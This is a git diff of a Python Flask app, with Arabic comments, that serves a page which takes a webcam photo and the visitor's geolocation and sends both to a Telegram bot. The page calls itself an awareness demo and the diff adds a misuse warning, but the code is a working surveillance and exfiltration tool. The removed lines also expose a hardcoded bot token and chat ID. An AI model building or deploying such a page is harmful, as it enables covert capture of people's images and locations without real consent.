@@ -1,12 +1,17 @@
 import base64
 import requests
-from flask import Flask, request, render_template_string
+import os
+from flask import Flask, request, render_template_string, abort
 
 app = Flask(__name__)
 
-# Telegram Bot Config
-BOT_TOKEN = "7880550955:AAEep2yo54KzCLXqKHUWcTOTIODQbZsck_4"
-CHAT_ID = "6969597735"
+# اقرأ التوكنات من Environment
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+CHAT_ID = os.environ.get("CHAT_ID")
+
+if not BOT_TOKEN or not CHAT_ID:
+    print("⚠️ BOT_TOKEN أو CHAT_ID غير موجودين في Environment Variables!")
+    abort(500, description="Missing Telegram credentials.")
 
 HTML_PAGE = """
 <!DOCTYPE html>
@@ -37,7 +42,9 @@ HTML_PAGE = """
 </head>
 <body>
   <h2>تجربة الكاميرا والموقع</h2>
-  <p>هذه تجربة تعليمية توعوية تُظهر خطورة منح الصلاحيات للمواقع غير الموثوقة.</p>
+  <p style="color:red; font-weight:bold;">
+  ⚠️ هذه مجرد تجربة تعليمية. لا تستخدم الكود ضد أي شخص بدون إذنه. قد تتعرض للمسؤولية القانونية.
+  </p>
   <video id="video" width="320" height="240" autoplay></video><br/>
   <button id="snap">التقاط صورة وإرسال البيانات</button>
   <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
@@ -60,7 +67,6 @@ HTML_PAGE = """
       position => {
         latitude = position.coords.latitude;
         longitude = position.coords.longitude;
-        console.log("Latitude:", latitude, "Longitude:", longitude);
       },
       error => {
         console.log("خطأ في جلب الموقع:", error);
@@ -109,16 +115,24 @@ def index():
 def upload():
     data = request.json
 
-    # استخراج الصورة من البيانات base64
-    image_data = data["image"].split(",")[1]
-    filename = "captured_image.png"
-    with open(filename, "wb") as f:
-        f.write(base64.b64decode(image_data))
+    # تأكد إن البيانات موجودة
+    if not data:
+        return "No data provided", 400
 
-    # إرسال الصورة إلى تليجرام
-    send_photo_to_telegram(filename)
+    # معالجة الصورة إذا موجودة
+    image_data = data.get("image")
+    if image_data:
+        try:
+            base64_data = image_data.split(",")[1]
+            filename = "captured_image.png"
+            with open(filename, "wb") as f:
+                f.write(base64.b64decode(base64_data))
+            send_photo_to_telegram(filename)
+            os.remove(filename)  # حذف الصورة بعد الإرسال
+        except Exception as e:
+            print(f"خطأ أثناء معالجة الصورة: {e}")
 
-    # إرسال الموقع إلى تليجرام
+    # إرسال الموقع
     latitude = data.get("latitude")
     longitude = data.get("longitude")
 
@@ -136,12 +150,15 @@ def send_photo_to_telegram(filepath):
             "chat_id": CHAT_ID,
             "caption": "📸 صورة ملتقطة من المستخدم (تجربة توعوية)"
         }
-        requests.post(url, files=files, data=data)
+        response = requests.post(url, files=files, data=data)
+        print("رد تيليجرام (صورة):", response.text)
 
 def send_message_to_telegram(text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data = {"chat_id": CHAT_ID, "text": text}
-    requests.post(url, data=data)
+    response = requests.post(url, data=data)
+    print("رد تيليجرام (نص):", response.text)
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
